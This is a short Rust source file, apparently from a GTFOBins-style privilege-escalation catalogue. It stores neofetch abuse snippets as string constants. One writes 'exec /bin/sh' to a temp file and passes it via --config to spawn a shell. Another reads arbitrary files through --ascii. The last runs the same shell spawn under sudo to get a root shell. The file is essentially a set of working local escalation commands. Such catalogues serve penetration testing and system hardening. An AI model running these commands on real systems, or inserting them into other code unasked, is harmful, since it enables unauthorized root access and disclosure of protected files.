pub static BIN_NAME: &'static str = "neofetch";
pub static SH_CODE: &'static str = r#"
    
    TF=$(mktemp)
    echo 'exec /bin/sh' >$TF
    neofetch --config $TF
"#;
pub static FR_DESC: &'static str = "The file content is used as the logo while some other information is displayed on its right, thus it might not be suitable to read arbitray binary files.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    neofetch --ascii $LFILE
"#;
pub static SUDO_CODE: &'static str = r#"
    
    TF=$(mktemp)
    echo 'exec /bin/sh' >$TF
    sudo neofetch --config $TF
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
